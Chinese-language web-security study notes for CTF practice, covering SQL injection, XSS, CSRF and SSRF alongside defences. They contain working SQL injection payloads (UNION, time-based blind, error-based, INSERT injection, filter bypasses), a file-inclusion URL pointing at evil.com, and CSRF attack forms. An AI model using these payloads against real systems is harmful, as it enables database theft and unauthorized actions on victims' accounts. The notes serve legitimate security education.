# Web
[Web安全学习笔记](https://websec.readthedocs.io/zh/latest/vuln/index.html)

Web漏洞挖掘的关键：
- 全面的信息收集
- 完整的功能分析
- 清晰的利用逻辑
- 丰富的知识储备
更重要的是耐心！


[每日推送Bug Bounty相关文章](https://t.me/thebugbountyhunter )

[专门做CTF的Youtube博主](https://www.youtube.com/@_JohnHammond)

[DEFCON](https://www.youtube.com/@DEFCONConference)

[request库的使用](https://www.runoob.com/python3/python-requests.html)


=== "静态网页"
    完全“按原样”呈现给浏览器的网页
    - 由 HTML、CSS 和 JavaScript 组成，可能含有图片、视频等静态资源
    - 需要发送给客户端的所有文件都是用户可以查看源代码的

=== "动态网页"
    根据用户的请求动态生成内容的网页
    - 通常由服务器端的程序生成，如 Java、PHP、Python、Node.js 等.也即，需要一个能够运行此种程序的服务器
    - 程序的代码对客户端不可见，客户端只能看到生成的结果（HTML）

=== "网页服务器"
    用于处理 HTTP 请求的软件，例如 Apache、Nginx、IIS 等
    也可以使用 Node.js、Python 等编程语言的库

!!! tip "**Web 应用架构：客户端+服务端**"
    === "客户端：你的浏览器"
        - 可视化：图形、图片、布局…… HTML + CSS
        - 人机交互逻辑：按钮点击，登录，发送请求……JS
        - 缓存、Cookie
        - 安全：不能将私密的、不该获取的信息传出去（比如 Cookie），不能为所欲为（比如注销其他网站的账号）
    
    === "服务端：某台或很多台服务器"
        - 认证与鉴权：如何证明你是你
            - Authentication
            - Authorization
        - 处理请求：用户需要做什么？将结果返回客户端
        - 服务器也可以有不同分工：前端后端、数据库……
        - 安全：用户不能获得不该获取的信息（比如 flag），不能为所欲为（比如任意代码执行）

## 前置科技
**插件**
- Hackbar
- Cookie-Editor
- SwitchOmega

**软件**
- BurpSuite, Kali 自带
- PHPStudy，[安装 phpstudy on Kali](https://blog.csdn.net/weixin_54358903/article/details/127698009)
- sqlmap, Kali 自带


[phpstudy on Kali 搭建小皮面板 配置sqli靶场](https://blog.csdn.net/qq_45301512/article/details/128931564)

按照这个教程可以基本配置成功，需要注意的是配置本地host文件的时候，域名的ip地址是本机
使用`ifconfig`查看本机ip地址


## 后端：业务逻辑
- 逻辑漏洞：验证不充分、想当然的写法、条件竞争、未发现的旁门左道……
    - 程序员的傲慢可能会让他认为`a==1&&a==2` 一定是 false 但……

![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/158f919d-d6bc-4e6d-842d-7480f90ccecc/31d85cd7-3d28-45ce-a7ea-040e2b4003fd/Untitled.png)

- 任意文件读与任意代码执行
    - 例如一个Web应用允许用户上传头像，但未对上传的文件进行严格的类型和内容检查。攻击者上传一个包含恶意代码的文件，并通过文件包含漏洞执行该代码，从而控制服务器。
    - CTF竞赛中，能读服务器上 `/flag` 则读，否则就暗示我们需要 RCE (不然连 flag 在哪个文件都不知道).
- 文件包含：例如一个Web应用允许用户通过URL参数指定要包含的文件，如`index.php?page=about`。攻击者可以通过构造恶意URL，如`index.php?page=http://evil.com/malicious.php`，包含远程恶意文件，从而执行恶意代码。
- 越权：例如一个Web应用允许用户查看自己的订单信息，但未正确验证用户的身份。攻击者可以通过篡改URL参数，如`order.php?id=123`，查看其他用户的订单信息。
    - 永远不要相信用户的数据！前端代码也许永远不会访问其他用户的数据，但这不代表恶意攻击者就不会。

## 前端：可视化和操作逻辑




## SQL注入
当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。

!!! note "本质"
    把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则

### 直接回显的注入
存在注入->SQL语句可以以一种“意料之外”的方式被解析

![](https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240709155833.png)

传入全部各种特殊字符 '"~!@#$%^&*()`
```sql
SELECT col_name(…) FROM table_name WHERE id = '"~!@#$%^&*()`       /*数字型*/
```

```sql
SELECT col_name(…) FROM table_name WHERE id = ''"~!@#$%^&*()`'     /*字符型*/
```

不管内部结构怎么样，这样肯定能出错，检测效率高


借助联合查询:
```sql
SELECT field1, fieldN FROM table_name UNION SELECT field1*, …, fieldN* FROM table_name*;
```

!!! note "如何确定sql数据库有多少列"
    ```sql
    SELECT * FROM TABLE_NAME ORDER BY 1; /* 1,2,3,4 */
    ```
    如果有正常返回，则说明可以继续尝试


我们可以尝试传入`id=1 UNION SELECT {secret_data}` 从而使拼接的SQL语句变为：
```sql
SELECT col_name(…) FROM table_name WHERE id = 1 UNION SELECT {secret_data};
```
这样，联合查询就会覆盖SQL查询的结果，并借助PHP代码实现的HTML嵌入，将我们想要的信息嵌在页面里传回来！

在MySQL中，所有的数据库名存放在information_schema.schemata的schema_name字段下
```sql
SELECT schema_name FROM information_schema.schemata;
```
所有的表名存放在information_schema.tables的table_name字段下，可以以table_schema为条件筛选
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='db_name';
```

所有的列名存放在information_schema.columns的column_name字段下，可以以table_schema和table_name为条件筛选
```sql
SELECT column_name FROM information_schema.columns WHERE table_name='table_name' AND table_schema='db_name';
```





### 无回显的注入

传入uname='
```sql
SELECT col_name(…) FROM table_name WHERE username = ''' /*报错*/
```
而uname="时
```sql
SELECT col_name(…) FROM table_name WHERE username = '"' /*不报错*/
```
说明是单引号闭合


!!! note "sql将所有字符串认为都是0"
    如果传入的是字符串，那么sql会将其认为是0，所以`id='0'`和`id='1'`是等价的

    所以会将该列的全部字符串都进行返回


    ```sql
    SELECT * FROM table_name WHERE id = '0' OR '1'='1';
    ```
    无论id是否为0，这个条件永远为真


![](https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240709152231.png)

延时注入：1bit信息不足以满足要求

不管返回什么值，只关心返回的时间。泛用性最广



`SUBSTR(str, pos, len) `可截取字符串
str参数代表待截取的字符串
pos参数代表从什么位置开始截取(下标从1开始)
len参数表示字符串截取的⻓度

`ASCII(char)`将字符转为ASCII码

那么，我们用`SUBSTR()`一位位取出要查找内容的字符，再用`ASCII()`转化为ASCII码，就能用二分法获取数据了


```sql
IF(condition, true, false)
```
如果condition为真就执行expr1，反之执行expr2

和`SLEEP()`配合，就能通过测量响应时间来获取数据！


```sql
SELECT col_name(…) FROM table_name WHERE username = 'admin' and IF(ASCII(SUBSTR(DATABASE(), 1, 1))>0, SLEEP(0), SLEEP(2))#'
```

如果延时超过2秒，说明条件为假，反之为真

!!! note "and 和or的使用"
    and 找False值
    or 找 True值
    但延时注入的时候，如果or前为恒假值，那么就会遍历整个数据库，即会延时很久。
    所以应该先找到一个恒正值，再使用and

### 一些特殊的注入


是否有可能注入INSERT, UPDATE, DELETE语句？


假设某用户注册场景，username/email/password分别用POST参数uname&email&passwd传入
```sql
INSERT INTO `users` VALUES (100, '{username}', '{email}', '{password}');
```


在不知道SQL语句结构的情况下，最保险的方案是时间盲注，只需简单闭合即可
传入`uname='='' AND IF({condition}, SLEEP(0), SLEEP(5)) AND ''='&email=a&passwd=b` 语句变为

```sql
INSERT INTO `users` VALUES (100, ''='' AND IF({condition}, SLEEP(0), SLEEP(5)) AND ''='', 'a', 'b');
```

如果已经知道INSERT语句的结构，我们可以直接篡改后续的插入内容
传入`uname=', DATABASE(), '')#&email=a&passwd=b` 语句变为


```sql
INSERT INTO `users` VALUES (100, '', DATABASE(), '')#', 'a', 'b');
```
注册用户的email栏会直接展示数据库名


!!! note  "一个仅限MySQL的技巧"
    传入`uname=0'|CONV(HEX(SUBSTR(USER(),1, 8)),16, 10)|'0&email=a&passwd=b`

    ```sql
    INSERT INTO `users` VALUES (100, '0'|CONV(HEX(SUBSTR(USER(),1, 8)),16, 10)|'0', 'a', 'b');
    ```
    将结果转换回字符即可UNHEX(CONV(res, 10, 16))

#### 报错注入

核心思想就是让我们要查询的信息输出到报错信息中去

`EXTRACTVALUE(xml_document,Xpath_string)`
使⽤Xpath格式的字符串从xml_document中获得内容，Xpath格式(一般为/a/b/…)错误就会报错，报错信息中会输出`Xpath_string`

那么我们可以刻意构造错误的`Xpath_string`和我们想要查询的数据拼接
比如，只要查询中执行了 `EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e))` 就必定报错(0x7e是~的编码)，DATABASE()会作为Xpath的一部分出现在报错信息中
这个技巧可以用在任何回显报错信息的场景中。同理还有很多其他的MySQL可用的报错注入函数。

```sql
mysql> select EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e));
ERROR 1105 (HY000): XPATH syntax error: '~web~'
```
由上面结果可知，database名字被获取到了

#### 二次注入

对数据进行转义是为了防止SQL语句执行时出现问题，存储的原始数据并没有转义。
那么，如果某个数据被存入时携带了恶意的SQL语句，由于存入操作进行了良好的转义没有造成注入，但是服务端的其他功能读取这串数据用于拼接SQL语句时没有转义，可能也会造成注入。

![](https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240710112244.png)

### SQL注入的绕过
常见防护方法：

- 直接拦截

- 关键字替换

- 编码转义

- 参数化查询：不会把参数执行



1. 关键字匹配(直接查找/正则)

2. 语义匹配

**绕过方法**
- 针对关键字/正则匹配
- 大小写
- 利用等价命令 比如 `OR->||, SPACE->/**/, ORDER BY->GROUP BY …`
- 如果只是单纯删去关键字，且只删一次，可以嵌套绕过，比如`UNION`是关键字会被删除，那么传入`UNUNIONION`就会被删成`UNION`，从而注入

- 超长字符串绕过
- 多次编码(需要服务端有相应解码功能)
- `%00`截断/换行截断
- 改变请求方式 `GET->POST`, `?a=1 -> /a/1`


针对语义匹配
相对难度较大，只能利用语言特性把语义检测绕晕。常见办法是嵌套注释符让其以为全部内容都被注释了。



### 一个SQL注入攻击实例

![](https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240709162751.png)

!!! note "sql注入的本质"
    SQL注入产生在服务端运行的编程语言和SQL服务器的边界上
    SQL注入的本质是构造一条产生有效信息输送的信息链！


漏洞产生在哪一个边界上决定了漏洞的类型而信息链如何被构造决定了漏洞的利用方式
——Джерри Чу


## XSS | 跨站脚本攻击

存储型XSS（Stored XSS）：恶意脚本被永久存储在目标服务器上，例如在数据库、留言板、评论区等。当用户浏览含有这些脚本的页面时，脚本会被执行。

反射型XSS（Reflected XSS）：恶意脚本不会被存储在服务器上，而是通过URL参数等方式反射回用户。当用户点击带有恶意脚本的链接时，脚本会在用户浏览器中执行。

基于DOM的XSS（DOM-based XSS）：恶意脚本通过修改页面的DOM（文档对象模型）结构在客户端执行。与前两种XSS不同，这种类型的XSS攻击完全在客户端进行，不依赖服务器的响应。


### 防护措施
- **输入验证：** 在服务器端对用户输入进行严格的验证和过滤，拒绝任何可疑的输入。
- **输出编码：** 在将用户输入显示在页面上时，进行适当的编码，防止恶意代码被执行。

```
function escapeHTML(str) {
    return str.replace(/&/g, '&amp;')
              .replace(/</g, '&lt;')
              .replace(/>/g, '&gt;')
              .replace(/"/g, '&quot;')
              .replace(/'/g, '&#039;');
}
// 不推荐这样用黑名单制度过滤：往往存在绕过风险
```

- **Content Security Policy (CSP)：** 在HTTP头中设置CSP策略，限制页面可以加载的资源。

```
Content-Security-Policy: default-src 'self'; script-src 'self' <https://trusted.com>
```


## CSRF | 跨站请求伪造
本章节来源于[CSRF攻击原理和防范措施](https://segmentfault.com/a/1190000024490213)


`Cross-site request forgery`，也被称为 `one-click attack` 或者 `session riding`，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，**CSRF 利用的是网站对用户网页浏览器的信任**。


### 原理
![](https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240703150007.png)
- 首选用户通过浏览器访问网银系统
- 用户在网银登录后，浏览器会把用户session_id保存在浏览器Cookie中
- 此时用户在同一个浏览器中访问了第三方网站
- 第三方网站诱导用户访问了网页转账的链接
- 由于用户在网银系统已经登录了，浏览器访问网银转账链接时，会带上用户在网银的Cookie信息
- 网银系统根据用户提交Cookie中的session_id，以为用户本人发起了转账操作，于是执行转账业务。

至此，在用户不知情的情况下，网银执行了转账业务，这就是**跨站（第三方站点的发起请求）请求伪造（非用户发起的请求）**的基本攻击原理。
### 方法

1. 通过图片发起请求
```html
<img src="http://bank.com/transfer?account=lisi&amount=100">
```

2. 通过表单发起请求
```html
<form action="http://bank.com/transfer">
    <input type="hidden" name="account" value="lisi">
    <input type="hidden" name="amount" value="100">
</form>
<script>
form[0].submit();
</script>
```

3. 通过链接发起请求
```html
<a href="http://bank.com/transfer?account=lisi&amount=100">你想象不到的精彩，点我查看</a>
```

### 防御措施
!!! note "成功攻击条件"
    - 用户在被攻击的系统中登录了。
    - 用户在第三方系统触发了对被攻击系统的请求，而被攻击服务器无法识别此请求来源。

针对第一个条件，防范措施包括：

- 对重要的操作进行二次认证，防止操作在后台自动执行。
- 设置适当的会话超时时间，防止用户离开后，其他用户在同一个浏览器中操作。
- 养成良好的习惯，离席锁屏。

针对第二个条件，是我们从技术层面要重点防范的，可选的防范措施包括：

- 语义一致性：良好的编程习惯，操作类请求，必须使用`POST`，`GET`只用于浏览类请求。
- 阻止外域访问
  1. 同源检测：服务器端通过请求的Origin Header和Referer Header，判断请求的来源。
  2. `Samesite Cookie`：控制只有同域（子域）能访问Cookie。
- 随机数一致性检测
  1. `CSRF Token`：用户登录后，生成随机值`csrf_token`，用户提交的操作类（POST）请求中，提交的表单中携带`csrf_token`，服务器端判断`csrf_token`是否正确。
  2. 双重`Cookie`验证：Cookie中保存`csrf_token`，用户提交表单中也携带`csrf_token`，服务器端判断两个值是否一致。
```HTML
<form action="<https://bank.com/transfer>" method="POST">
    <input type="hidden" name="csrf_token" value="random_token">
    <input type="text" name="to">
    <input type="text" name="amount">
    <input type="submit" value="转账">
</form>
```

## SSRF | 服务器端请求伪造
服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。

假设有一个Web应用允许用户输入URL并获取该URL的内容。攻击者可以输入内部服务的URL，获取敏感信息：

```
<https://example.com/fetch?url=http://internal-service:8080/secret>

```

很经典的例子：QQ机器人对url自动生成网页预览

!!! note "威胁"
    相当于可以将漏洞当做外网和内网之间的跳板，实现横向移动。

### 防护措施
**白名单机制：** 限制服务器只能访问特定的内部资源或外部资源，使用白名单机制进行防护。
```
ALLOWED_DOMAINS = ['example.com', 'trusted.com']

def fetch_url(url):
    parsed_url = urlparse(url)
    if parsed_url.netloc not in ALLOWED_DOMAINS:
        return "Access Denied"
    # 继续处理请求
```

![](https://philfan-pic.oss-cn-beijing.aliyuncs.com/img/20240709163411.png)